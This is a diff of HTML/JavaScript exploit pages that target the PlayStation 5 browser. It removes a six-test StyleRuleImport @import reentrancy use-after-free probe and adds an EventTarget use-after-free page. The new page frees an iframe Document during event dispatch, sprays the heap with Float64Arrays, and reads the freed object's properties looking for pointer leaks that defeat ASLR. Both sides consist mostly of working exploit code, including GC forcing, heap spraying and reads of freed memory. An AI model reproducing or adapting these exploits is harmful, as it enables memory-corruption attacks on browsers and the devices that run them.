@@ -1,547 +1,362 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>PS5 v66 - StyleRuleImport Reentrancy UAF</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
-font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
-#out{position:fixed;top:0;left:0;right:0;bottom:0;
-padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
--webkit-user-select:text}
-.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff}
-.mg{color:#ff00ff;font-weight:bold;font-size:14px}.dm{color:#006622}
-.hd{color:#00ff41;font-weight:bold;font-size:13px;letter-spacing:1px}
-button{display:block;width:100%;padding:15px;margin:5px 0;font-size:18px;
-background:#111;color:#00ff41;border:1px solid #00ff41;cursor:pointer}
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS5 v60 - EventTarget UAF Info Leak</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #ff00ff;
+            font-weight: bold;
+        }
+
+        .description {
+            color: #00ffff;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            font-size: 16px;
+            background: #111;
+            color: #00ff41;
+            border: 1px solid #00ff41;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            transition: all 0.2s;
+        }
+
+        button:hover {
+            background: #00ff41;
+            color: #0a0a0a;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        .output {
+            background: #000;
+            border: 1px solid #00ff41;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 4px;
+            max-height: 500px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+
+        .output-line {
+            margin: 2px 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        /* color classes */
+        .ok { color: #00ff41; }
+        .err { color: #ff3333; }
+        .warn { color: #ffcc00; }
+        .highlight { color: #00ffff; }
+        .critical { color: #ff00ff; font-weight: bold; }
+        .dim { color: #666; }
+    </style>
 </head>
 <body>
-<div id="out"></div>
-<script>
-"use strict";
+    <div class="container">
+        <h1>EventTarget UAF — Third Listener Info Leak</h1>
+        <p class="description">
+            Triggers a use-after-free in the event dispatch system by freeing the Document
+            mid-dispatch. The third listener executes after the throw, attempting to read
+            properties of a freed object. If we see corrupted or unusual values, we have a leak.
+        </p>
 
-var O=document.getElementById("out");
-function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
-function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
-function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
-function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
-function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(50),"dm")}
+        <button onclick="runExploit()">Trigger UAF + Third Listener Read</button>
 
-window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true};
+        <div class="output" id="output"></div>
+    </div>
 
-P("════════════════════════════════════","hd");
-P("  v66 — StyleRuleImport Reentrancy UAF","hd");
-P("  Source audit finding #2","hd");
-P("  Pure C++ reentrancy — NO JIT needed","hd");
-P("════════════════════════════════════","hd");
-P("");
+    <script>
+        // ============================================================
+        // logging system — single DOM update, batched output
+        // ============================================================
 
-// ============================================================
-// BACKGROUND
-// ============================================================
-// Source audit found: StyleRuleImport::setCSSStyleSheet()
-// calls checkLoaded() which fires JS 'load' event.
-// Inside load handler, we deleteRule() the @import rule.
-// This frees StyleRuleImport while setCSSStyleSheet() 
-// is still on the call stack. No Ref<> protection exists.
-// ============================================================
+        const outputEl = document.getElementById('output');
+        let logBuffer = [];
 
-var testNum = 0;
-
-function runTest(testName, testFn) {
-    testNum++;
-    Sep();Hd("TEST " + testNum + ": " + testName);Sep();
-    P("");
-    
-    try {
-        testFn();
-        Ok("Test " + testNum + " survived (no crash)");
-    } catch(e) {
-        Fl("Test " + testNum + " exception: " + e.message);
-    }
-    P("");
-    
-    // Small delay between tests
-    return new Promise(function(resolve){ setTimeout(resolve, 500); });
-}
-
-// ============================================================
-// TEST 1: Basic @import reentrancy via <link>
-// ============================================================
-// <link rel="stylesheet" href="data:text/css,@import url(data:text/css,...)">
-// When inner @import completes → checkLoaded() → load event on <link>
-// Inside load: link.sheet.deleteRule(0) → frees StyleRuleImport
-// ============================================================
-
-function test1_basic_link_import() {
-    Dm("Creating <link> with @import...");
-    
-    var link = document.createElement('link');
-    link.rel = 'stylesheet';
-    
-    // Outer CSS contains @import to inner CSS
-    var outerCSS = '@import url("data:text/css,body{color:red}")';
-    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
-    
-    var loadFired = false;
-    var deleteSucceeded = false;
-    
-    link.onload = function() {
-        loadFired = true;
-        Dm("  [load] Event fired!");
-        
-        try {
-            var sheet = link.sheet;
-            if (!sheet) {
-                Wr("  [load] No sheet available");
-                return;
-            }
-            
-            Dm("  [load] sheet.cssRules.length = " + sheet.cssRules.length);
-            
-            if (sheet.cssRules.length > 0) {
-                var rule = sheet.cssRules[0];
-                Dm("  [load] Rule type: " + rule.constructor.name);
-                Dm("  [load] Rule href: " + rule.href);
-                
-                // DELETE the @import rule — this should trigger the UAF
-                Dm("  [load] Deleting rule 0...");
-                sheet.deleteRule(0);
-                deleteSucceeded = true;
-                Ok("  [load] deleteRule() succeeded!");
-                
-                // If we get here without crash, check if rule is still accessible
-                Dm("  [load] Accessing rule after delete...");
-                try {
-                    var href = rule.href;
-                    Dm("  [load] rule.href after delete: " + href);
-                } catch(e) {
-                    Dm("  [load] rule.href error: " + e.message);
-                }
-            }
-        } catch(e) {
-            Fl("  [load] Error: " + e.message);
+        function log(message, styleClass = '') {
+            const lineEl = document.createElement('div');
+            lineEl.className = `output-line ${styleClass}`;
+            lineEl.textContent = message;
+            outputEl.appendChild(lineEl);
+            outputEl.scrollTop = outputEl.scrollHeight;
         }
-    };
-    
-    document.head.appendChild(link);
-    
-    // Check after a delay
-    setTimeout(function() {
-        if (loadFired) {
-            Ok("  Load event fired");
-            if (deleteSucceeded) {
-                St("  ★ deleteRule() during load callback succeeded!");
-                Hi("  If browser didn't crash → UAF might be exploitable!");
-            }
-        } else {
-            Wr("  Load event did NOT fire (data: URI might load synchronously)");
-        }
-    }, 2000);
-}
 
-// ============================================================
-// TEST 2: @import inside <style> block
-// ============================================================
-
-function test2_style_import() {
-    Dm("Creating <style> with @import...");
-    
-    var style = document.createElement('style');
-    style.textContent = '@import url("data:text/css,body{color:blue}")';
-    
-    var loadFired = false;
-    
-    // <style> doesn't have onload in standard HTML
-    // But we can try mutation observer or other mechanisms
-    // Actually, let's try adding onload anyway — WebKit might support it
-    
-    style.onload = function() {
-        loadFired = true;
-        Dm("  [load] Style load event fired!");
-        
-        try {
-            var sheet = style.sheet;
-            if (sheet && sheet.cssRules.length > 0) {
-                Dm("  [load] Deleting rule 0...");
-                sheet.deleteRule(0);
-                Ok("  [load] deleteRule() succeeded!");
-            }
-        } catch(e) {
-            Fl("  [load] Error: " + e.message);
+        function logSection(title, styleClass = '') {
+            log('', '');
+            log(title, styleClass);
         }
-    };
-    
-    document.head.appendChild(style);
-    
-    // Also try checking after delay
-    setTimeout(function() {
-        if (!loadFired) {
-            Dm("  <style> load event didn't fire, trying manual check...");
+
+        // ============================================================
+        // UAF trigger and property reader
+        // ============================================================
+
+        function runExploit() {
+            outputEl.innerHTML = '';
+            log('=== EventTarget UAF — Third Listener Info Leak ===', 'critical');
+            log('');
+
             try {
-                var sheet = style.sheet;
-                if (sheet) {
-                    Dm("  sheet.cssRules.length = " + sheet.cssRules.length);
-                    if (sheet.cssRules.length > 0) {
-                        Dm("  Trying deleteRule(0)...");
-                        sheet.deleteRule(0);
-                        Ok("  Manual deleteRule() succeeded!");
+                // setup: create iframe and nested divs
+                const iframe = document.body.appendChild(document.createElement('iframe'));
+                const outerDiv = document.createElement('div');
+                const innerDiv = outerDiv.appendChild(document.createElement('div'));
+
+                log('[*] Setup: iframe created, document URL: ' + iframe.contentDocument.URL);
+
+                // ============================================================
+                // LISTENER 1: trigger GC and heap spray
+                // frees the Document and attempts to reclaim its memory slot
+                // ============================================================
+
+                outerDiv.addEventListener('exploit-event', function listener1() {
+                    log('[L1] Adopting node and removing iframe...');
+                    document.adoptNode(outerDiv);
+                    iframe.remove();
+
+                    // GC pressure: allocate large buffers to force collection
+                    log('[L1] Forcing GC (32MB allocation)...');
+                    const gcBuffers = [];
+                    for (let i = 0; i < 8; i++) {
+                        const chunk = [];
+                        for (let j = 0; j < 256; j++) {
+                            chunk.push(new ArrayBuffer(65536));
+                        }
+                        gcBuffers.push(chunk);
                     }
-                }
-            } catch(e) {
-                Fl("  Manual check error: " + e.message);
-            }
-        }
-    }, 2000);
-}
 
-// ============================================================
-// TEST 3: Multiple @imports — delete one during load
-// ============================================================
-
-function test3_multiple_imports() {
-    Dm("Creating <link> with multiple @imports...");
-    
-    var link = document.createElement('link');
-    link.rel = 'stylesheet';
-    
-    // Outer CSS with multiple @imports
-    var outerCSS = [
-        '@import url("data:text/css,body{color:red}")',
-        '@import url("data:text/css,div{color:blue}")',
-        '@import url("data:text/css,p{color:green}")'
-    ].join('\n');
-    
-    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
-    
-    var loadCount = 0;
-    
-    link.onload = function() {
-        loadCount++;
-        Dm("  [load] Event fired (count: " + loadCount + ")");
-        
-        try {
-            var sheet = link.sheet;
-            if (!sheet) return;
-            
-            Dm("  [load] Rules: " + sheet.cssRules.length);
-            
-            // Delete the FIRST @import rule
-            if (sheet.cssRules.length > 0) {
-                Dm("  [load] Deleting rule 0...");
-                
-                // Save reference before delete
-                var savedRule = sheet.cssRules[0];
-                Dm("  [load] savedRule.href = " + savedRule.href);
-                
-                sheet.deleteRule(0);
-                Ok("  [load] deleteRule(0) succeeded!");
-                
-                // Try to read from saved rule (UAF read)
-                Dm("  [load] Reading savedRule.href after delete...");
-                try {
-                    var href = savedRule.href;
-                    Hi("  [load] savedRule.href = " + href);
-                    
-                    // Check if value is unusual
-                    if (href && href.indexOf("data:") === -1 && href.length > 0) {
-                        St("  ★ UNUSUAL VALUE DETECTED — possible info leak!");
+                    // heap spray: Float64Array with predictable pattern
+                    // goal: reclaim the freed Document slot with controlled data
+                    log('[L1] Spraying Float64Arrays to reclaim freed memory...');
+                    const spray = [];
+                    for (let i = 0; i < 1000; i++) {
+                        const buf = new ArrayBuffer(256);
+                        const f64 = new Float64Array(buf);
+                        // marker pattern: detect if spray landed
+                        f64[0] = 1.1;
+                        f64[1] = 2.2;
+                        f64[2] = 3.3;
+                        f64[3] = 4.4;
+                        spray.push(f64);
                     }
-                } catch(e) {
-                    Dm("  [load] savedRule.href error: " + e.message);
-                }
-                
-                // Try to read .styleSheet (pointer field)
-                Dm("  [load] Reading savedRule.styleSheet after delete...");
-                try {
-                    var ss = savedRule.styleSheet;
-                    Hi("  [load] savedRule.styleSheet = " + ss);
-                } catch(e) {
-                    Dm("  [load] savedRule.styleSheet error: " + e.message);
-                }
-                
-                // Try to read .media
-                Dm("  [load] Reading savedRule.media after delete...");
-                try {
-                    var media = savedRule.media;
-                    Hi("  [load] savedRule.media = " + media);
-                } catch(e) {
-                    Dm("  [load] savedRule.media error: " + e.message);
-                }
-            }
-        } catch(e) {
-            Fl("  [load] Error: " + e.message);
-        }
-    };
-    
-    document.head.appendChild(link);
-}
+                    log('[L1] Spray: 1000 Float64Arrays allocated');
 
-// ============================================================
-// TEST 4: @import + GC + spray + property read
-// ============================================================
+                    // throw to continue event dispatch to next listeners
+                    // this completes L1 and triggers L2
+                    throw {
+                        line: 1,
+                        column: 1,
+                        sourceURL: 'X'.repeat(1024 * 1024)
+                    };
+                });
 
-function test4_import_spray_read() {
-    Dm("Creating <link> with @import + spray...");
-    
-    var link = document.createElement('link');
-    link.rel = 'stylesheet';
-    
-    var outerCSS = '@import url("data:text/css,body{color:red}")';
-    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
-    
-    var savedRule = null;
-    
-    link.onload = function() {
-        Dm("  [load] Event fired!");
-        
-        try {
-            var sheet = link.sheet;
-            if (!sheet || sheet.cssRules.length === 0) return;
-            
-            // Save reference to the @import rule
-            savedRule = sheet.cssRules[0];
-            Dm("  [load] Saved rule reference");
-            Dm("  [load] rule.href = " + savedRule.href);
-            
-            // Delete the rule — frees StyleRuleImport if no other refs
-            Dm("  [load] Deleting rule...");
-            sheet.deleteRule(0);
-            Ok("  [load] Rule deleted");
-            
-            // Force GC to ensure the C++ object is freed
-            Dm("  [load] Forcing GC (16MB)...");
-            for (var i = 0; i < 4; i++) {
-                var t = [];
-                for (var j = 0; j < 128; j++) t.push(new ArrayBuffer(8192));
-            }
-            
-            // Spray with strings to reclaim the freed memory
-            Dm("  [load] Spraying strings...");
-            var spray = [];
-            for (var i = 0; i < 1000; i++) {
-                // Create strings that look like pointers
-                var s = String.fromCharCode(
-                    0x41, 0x41, 0x41, 0x41,  // 0x41414141
-                    0x00, 0x00, 0x00, 0x01,  // 0x01000000 (pointer-like)
-                    0x42, 0x42, 0x42, 0x42,
-                    0x00, 0x00, 0x00, 0x02
-                );
-                spray.push(s);
-            }
-            
-            // Now try to read properties through the saved reference
-            // If the C++ StyleRuleImport was freed and reclaimed by our spray,
-            // the getter will read from our controlled data
-            
-            Dm("  [load] Reading savedRule.href...");
-            try {
-                var href = savedRule.href;
-                Hi("  [load] href = '" + href + "'");
-                Hi("  [load] href length = " + href.length);
-                
-                // Check for non-ASCII (raw memory)
-                var hasRaw = false;
-                var hex = "";
-                for (var i = 0; i < Math.min(href.length, 32); i++) {
-                    var c = href.charCodeAt(i);
-                    if (c < 0x20 || c > 0x7E) hasRaw = true;
-                    var h = c.toString(16);
-                    hex += (h.length === 1 ? "0" + h : h) + " ";
-                }
-                
-                if (hasRaw) {
-                    St("  ★ RAW MEMORY IN href — INFO LEAK!");
-                    P("  hex: " + hex, "hl");
-                }
-            } catch(e) {
-                Fl("  [load] href error: " + e.message);
-            }
-            
-            Dm("  [load] Reading savedRule.styleSheet...");
-            try {
-                var ss = savedRule.styleSheet;
-                Hi("  [load] styleSheet = " + ss);
-                if (ss !== null && ss !== undefined) {
-                    St("  ★ styleSheet NOT null — possible type confusion!");
-                }
-            } catch(e) {
-                Fl("  [load] styleSheet error: " + e.message);
-            }
-            
-        } catch(e) {
-            Fl("  [load] Error: " + e.message);
-        }
-    };
-    
-    document.head.appendChild(link);
-}
+                // ============================================================
+                // LISTENER 2: buffer (catches throw, dispatch continues)
+                // ============================================================
 
-// ============================================================
-// TEST 5: Nested @import (import within import)
-// ============================================================
+                outerDiv.addEventListener('exploit-event', function listener2() {
+                    log('[L2] Buffer listener: exception caught, dispatch continues');
+                });
 
-function test5_nested_import() {
-    Dm("Creating nested @import chain...");
-    
-    var link = document.createElement('link');
-    link.rel = 'stylesheet';
-    
-    // Innermost CSS
-    var innerCSS = 'body{color:green}';
-    
-    // Middle CSS (imports inner)
-    var middleCSS = '@import url("data:text/css,' + encodeURIComponent(innerCSS) + '")\nbody{color:blue}';
-    
-    // Outer CSS (imports middle)
-    var outerCSS = '@import url("data:text/css,' + encodeURIComponent(middleCSS) + '")\nbody{color:red}';
-    
-    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
-    
-    link.onload = function() {
-        Dm("  [load] Outer load fired!");
-        
-        try {
-            var sheet = link.sheet;
-            if (!sheet) return;
-            
-            Dm("  [load] Rules: " + sheet.cssRules.length);
-            
-            if (sheet.cssRules.length > 0) {
-                var importRule = sheet.cssRules[0];
-                Dm("  [load] Import rule href: " + importRule.href);
-                
-                // Access the imported stylesheet
-                var importedSheet = importRule.styleSheet;
-                if (importedSheet) {
-                    Dm("  [load] Imported sheet rules: " + importedSheet.cssRules.length);
-                    
-                    // Delete the outer @import rule
-                    Dm("  [load] Deleting outer @import...");
-                    sheet.deleteRule(0);
-                    Ok("  [load] Outer @import deleted!");
-                    
-                    // Now try to access the imported sheet (UAF)
-                    Dm("  [load] Accessing importedSheet after delete...");
+                // ============================================================
+                // LISTENER 3: read freed Document
+                // executes after throw. Document should be freed; we read via iframe.contentDocument
+                // ============================================================
+
+                outerDiv.addEventListener('exploit-event', function listener3() {
+                    logSection('[L3] Third listener executing — reading freed Document...', 'highlight');
+
+                    let doc = null;
+                    let results = [];
+
+                    // attempt to access the potentially freed Document
                     try {
-                        var rules = importedSheet.cssRules;
-                        Hi("  [load] importedSheet.cssRules.length = " + rules.length);
-                        
-                        // Try reading rules from the freed sheet
-                        for (var i = 0; i < rules.length; i++) {
-                            var r = rules[i];
-                            Dm("  [load] Rule " + i + ": " + r.cssText);
+                        doc = iframe.contentDocument;
+                        if (doc) {
+                            log('[L3] iframe.contentDocument returned an object', 'highlight');
+                        } else {
+                            log('[L3] iframe.contentDocument is null (expected after removal)', 'dim');
                         }
-                    } catch(e) {
-                        Fl("  [load] importedSheet access error: " + e.message);
+                    } catch (e) {
+                        log('[L3] iframe.contentDocument access threw: ' + e.message, 'err');
                     }
+
+                    if (doc) {
+                        readDocumentProperties(doc, results);
+                    } else {
+                        log('[L3] No document object, attempting fallback access...', 'warn');
+                        attemptFallbackAccess(iframe);
+                    }
+
+                    // summary and leak detection
+                    logSection('[L3] Results', 'critical');
+                    const unusualCount = results.filter(r => r.unusual).length;
+                    log('Properties checked: ' + results.length);
+                    log('Unusual values: ' + unusualCount, unusualCount > 0 ? 'highlight' : 'dim');
+
+                    if (unusualCount > 0) {
+                        log('', '');
+                        log('★ INFO LEAK DETECTED ★', 'critical');
+                        log('Unusual values may contain heap pointers / ASLR bypass', 'highlight');
+                    } else {
+                        log('', '');
+                        log('No unusual values. Document may not have freed, or spray missed.', 'warn');
+                    }
+
+                    log('=== Test Complete ===', 'critical');
+                });
+
+                // dispatch event, triggering all three listeners in order
+                log('[*] Dispatching event...');
+                log('');
+                innerDiv.dispatchEvent(new Event('exploit-event', { bubbles: true }));
+
+                // if we reach here, browser survived
+                log('[+] Browser survived (no crash)', 'ok');
+
+            } catch (e) {
+                log('[!] Outer exception: ' + e.message, 'err');
+                if (e.stack) log('Stack: ' + e.stack, 'err');
+            }
+        }
+
+        // ============================================================
+        // property reader: check Document properties for anomalies
+        // ============================================================
+
+        function readDocumentProperties(doc, results) {
+            const props = [
+                'nodeType', 'nodeName', 'URL', 'title', 'domain',
+                'referrer', 'cookie', 'readyState', 'compatMode',
+                'characterSet', 'contentType', 'documentElement',
+                'head', 'body', 'images', 'links', 'forms', 'scripts',
+                'styleSheets', 'fonts', 'implementation', 'location',
+                'defaultView', 'activeElement', 'currentScript',
+                'visibilityState', 'hidden', 'fullscreenEnabled',
+                'childElementCount', 'firstElementChild', 'lastElementChild'
+            ];
+
+            logSection('[L3] Property scan:', 'highlight');
+
+            for (let i = 0; i < props.length; i++) {
+                const prop = props[i];
+                try {
+                    const val = doc[prop];
+                    const str = String(val);
+                    const unusual = detectAnomaly(prop, val, str);
+
+                    const prefix = unusual ? '[+]' : '[-]';
+                    const style = unusual ? 'highlight' : 'dim';
+                    log(`  ${prefix} ${prop} = ${str}`, style);
+
+                    results.push({ prop, value: val, unusual });
+
+                } catch (e) {
+                    log(`  [!] ${prop} access error: ${e.message}`, 'err');
+                    results.push({ prop, error: e.message, unusual: false });
                 }
             }
-        } catch(e) {
-            Fl("  [load] Error: " + e.message);
-        }
-    };
-    
-    document.head.appendChild(link);
-}
 
-// ============================================================
-// TEST 6: Rapid create + delete + read
-// ============================================================
+            // attempt Object introspection
+            logSection('[L3] Object introspection:', 'highlight');
 
-function test6_rapid_create_delete() {
-    Dm("Rapid @import create/delete cycle...");
-    
-    var results = [];
-    
-    for (var cycle = 0; cycle < 10; cycle++) {
-        try {
-            var link = document.createElement('link');
-            link.rel = 'stylesheet';
-            
-            var css = '@import url("data:text/css,body{color:red}")';
-            link.href = 'data:text/css,' + encodeURIComponent(css);
-            
-            var savedRule = null;
-            var localCycle = cycle;
-            
-            link.onload = function() {
+            const introspectionMethods = [
+                { name: 'toString', fn: () => doc.toString() },
+                { name: 'constructor', fn: () => String(doc.constructor) },
+                { name: 'Object.keys', fn: () => Object.keys(doc).join(', ') },
+                { name: 'Object.getOwnPropertyNames', fn: () => Object.getOwnPropertyNames(doc).join(', ') },
+                { name: 'Object.getPrototypeOf', fn: () => String(Object.getPrototypeOf(doc)) },
+                { name: 'Reflect.ownKeys', fn: () => Reflect.ownKeys(doc).join(', ') }
+            ];
+
+            for (const method of introspectionMethods) {
                 try {
-                    var sheet = link.sheet;
-                    if (sheet && sheet.cssRules.length > 0) {
-                        savedRule = sheet.cssRules[0];
-                        var hrefBefore = savedRule.href;
-                        
-                        sheet.deleteRule(0);
-                        
-                        // Force GC
-                        for (var i = 0; i < 2; i++) {
-                            var t = [];
-                            for (var j = 0; j < 64; j++) t.push(new ArrayBuffer(8192));
-                        }
-                        
-                        // Read after delete
-                        var hrefAfter = savedRule.href;
-                        
-                        if (hrefBefore !== hrefAfter) {
-                            St("  Cycle " + localCycle + ": VALUE CHANGED!");
-                            P("    Before: " + hrefBefore, "hl");
-                            P("    After:  " + hrefAfter, "hl");
-                            results.push({cycle: localCycle, before: hrefBefore, after: hrefAfter});
-                        }
-                    }
-                } catch(e) {}
-            };
-            
-            document.head.appendChild(link);
-        } catch(e) {}
-    }
-    
-    // Check results after delay
-    setTimeout(function() {
-        P("");
-        Dm("Rapid cycle results:");
-        if (results.length > 0) {
-            St("  ★ " + results.length + " value changes detected!");
-        } else {
-            Dm("  No value changes detected");
+                    const result = method.fn();
+                    log(`  ${method.name}: ${result}`, 'dim');
+                } catch (e) {
+                    log(`  ${method.name} error: ${e.message}`, 'err');
+                }
+            }
         }
-    }, 3000);
-}
 
-// ============================================================
-// RUN ALL TESTS
-// ============================================================
+        // ============================================================
+        // anomaly detection: identify unusual values
+        // ============================================================
 
-async function runAll() {
-    P("Starting tests in 1 second...\n");
-    await new Promise(function(r){setTimeout(r, 1000)});
-    
-    await runTest("Basic <link> @import reentrancy", test1_basic_link_import);
-    await runTest("<style> @import reentrancy", test2_style_import);
-    await runTest("Multiple @imports — delete during load", test3_multiple_imports);
-    await runTest("@import + GC + spray + property read", test4_import_spray_read);
-    await runTest("Nested @import chain", test5_nested_import);
-    await runTest("Rapid create/delete cycle", test6_rapid_create_delete);
-    
-    // Final summary after all tests
-    setTimeout(function() {
-        Sep();Hd("FINAL SUMMARY");Sep();
-        P("");
-        P("  If any test crashed the browser → UAF is real");
-        P("  If any test showed 'UNUSUAL VALUE' → info leak possible");
-        P("  If all tests survived with normal values → defensive mechanism exists");
-        P("");
-        St("★ v66 StyleRuleImport UAF Test Complete ★");
-    }, 5000);
-}
+        function detectAnomaly(prop, val, str) {
+            // large numbers might be pointers
+            if (typeof val === 'number' && val > 0x10000) {
+                return true;
+            }
 
-// Start
-runAll();
+            // hex-like patterns in strings (excluding known-good patterns)
+            if (/[0-9a-f]{8,}/i.test(str) && str !== '[object HTMLDocument]') {
+                return true;
+            }
 
-</script>
+            // property-specific defaults: if it doesn't match, something's wrong
+            const expectedDefaults = {
+                'nodeType': 9,              // DOCUMENT_NODE
+                'URL': 'about:blank',
+                'readyState': 'complete',
+                'characterSet': 'UTF-8',
+                'contentType': 'text/html'
+            };
+
+            if (prop in expectedDefaults && val !== expectedDefaults[prop]) {
+                return true;
+            }
+
+            return false;
+        }
+
+        // ============================================================
+        // fallback: try alternate access methods if document is null
+        // ============================================================
+
+        function attemptFallbackAccess(iframe) {
+            try {
+                log('  iframe.tagName: ' + iframe.tagName, 'dim');
+                log('  iframe.parentNode: ' + (iframe.parentNode ? iframe.parentNode.nodeName : 'null'), 'dim');
+                log('  iframe.contentWindow: ' + String(iframe.contentWindow), 'dim');
+            } catch (e) {
+                log('  Fallback access error: ' + e.message, 'err');
+            }
+        }
+    </script>
 </body>
 </html>
